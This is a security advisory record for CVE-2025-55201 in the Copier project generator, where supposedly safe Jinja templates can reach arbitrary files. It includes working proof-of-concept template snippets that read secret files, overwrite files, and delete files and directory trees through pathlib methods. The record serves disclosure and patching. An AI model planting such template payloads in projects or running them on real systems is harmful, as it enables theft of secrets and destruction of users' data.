{
  "id": "GHSA-3xw7-v6cj-5q8h",
  "modified": "2025-08-18T21:57:29.152643Z",
  "published": "2025-08-18T21:00:23Z",
  "aliases": [
    "CVE-2025-55201"
  ],
  "summary": "Copier's safe template has arbitrary filesystem read/write access",
  "details": "### Impact\n\nCopier's current security model shall restrict filesystem access through Jinja:\n\n- Files can only be read using `{% include ... %}`, which is limited by Jinja to reading files from the subtree of the local template clone in our case.\n- Files are written in the destination directory according to their counterparts in the template.\n\nCopier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently read and write arbitrary files because we expose a few `pathlib.Path` objects in the Jinja context which have unconstrained I/O methods. This effectively renders our security model w.r.t. filesystem access useless.\n\n#### Arbitrary read access\n\nImagine, e.g., a malicious template author who creates a template that reads SSH keys or other secrets from well-known locations, perhaps \"masks\" them with Base64 encoding to reduce detection risk, and hopes for a user to push the generated project to a public location like [github.com](http://github.com/) where the template author can extract the secrets.\n\nReproducible example:\n\n- Read known file:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    echo \"stolen secret: {{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().read_text('utf-8') }}\" \u003e src/stolen-secret.txt.jinja\n    uvx copier copy src/ dst/\n    cat dst/stolen-secret.txt\n    ```\n\n- Read unknown file(s) via globbing:\n\n    ```shell\n    mkdir secrets/\n    echo \"s3cr3t #1\" \u003e secrets/secret1.txt\n    echo \"s3cr3t #2\" \u003e secrets/secret2.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/stolen-secrets.txt.jinja\n    stolen secrets:\n    {% set parent = (_copier_conf.dst_path / '..' / 'secrets').resolve() %}\n    {% for f in parent.glob('*.txt') %}\n    {{ f }}: {{ f.read_text('utf-8') }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat dst/stolen-secrets.txt\n    ```\n\n#### Arbitrary write access\n\nImagine, e.g., a malicious template author who creates a template that overwrites or even deletes files to cause havoc.\n\nReproducible examples:\n\n- Overwrite known file:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    echo \"{{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().write_text('OVERWRITTEN', 'utf-8') }}\" \u003e src/malicious.txt.jinja\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Overwrite unknown file(s) via globbing:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..').resolve() %}\n    {% for f in (parent.glob('*.txt') | list) %}\n    {{ f.write_text('OVERWRITTEN', 'utf-8') }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Delete unknown file(s) via globbing:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..').resolve() %}\n    {% for f in (parent.glob('*.txt') | list) %}\n    {{ f.unlink() }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Delete unknown files and directories via tree walking:\n\n    ```shell\n    mkdir data\n    mkdir data/a\n    mkdir data/a/b\n    echo \"foo\" \u003e data/foo.txt\n    echo \"bar\" \u003e data/a/bar.txt\n    echo \"baz\" \u003e data/a/b/baz.txt\n    tree data/\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..' / 'data').resolve() %}\n    {% for root, dirs, files in parent.walk(top_down=False) %}\n    {% for name in files %}\n    {{ (root / name).unlink() }}\n    {% endfor %}\n    {% for name in dirs %}\n    {{ (root / name).rmdir() }}\n    {% endfor %}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    tree data/\n    ```",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "copier",
        "purl": "pkg:pypi/copier"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "9.9.1"
            }
          ]
        }
      ],
      "versions": [
        "2.0.0",
        "2.0.1",
        "2.1.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.5.0",
        "2.5.1",
        "3.0.0a3",
        "3.0.0a5",
        "3.0.0a6",
        "3.0.0a7",
        "3.0.0a8",
        "3.0.0b1",
        "3.0.1",
        "3.0.2",
        "3.0.3",
        "3.0.4",
        "3.0.5",
        "3.0.6",
        "3.1.0",
        "3.2.0",
        "4.0.0",
        "4.0.1",
        "4.0.2",
        "4.1.0",
        "5.0.0",
        "5.1.0",
        "6.0.0",
        "6.0.0a0",
        "6.0.0a2",
        "6.0.0a3",
        "6.0.0a4",
        "6.0.0a5",
        "6.0.0a6",
        "6.0.0a7",
        "6.0.0a9",
        "6.0.0b0",
        "6.1.0",
        "6.2.0",
        "7.0.1",
        "7.1.0",
        "7.1.0a0",
        "7.2.0",
        "8.0.0",
        "8.1.0",
        "8.2.0",
        "8.3.0",
        "9.0.1",
        "9.1.0",
        "9.1.1",
        "9.2.0",
        "9.3.0",
        "9.3.1",
        "9.4.0",
        "9.4.1",
        "9.5.0",
        "9.6.0",
        "9.7.0",
        "9.7.1",
        "9.8.0",
        "9.9.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-3xw7-v6cj-5q8h/GHSA-3xw7-v6cj-5q8h.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55201"
    },
    {
      "type": "WEB",
      "url": "https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/copier-org/copier"
    }
  ]
}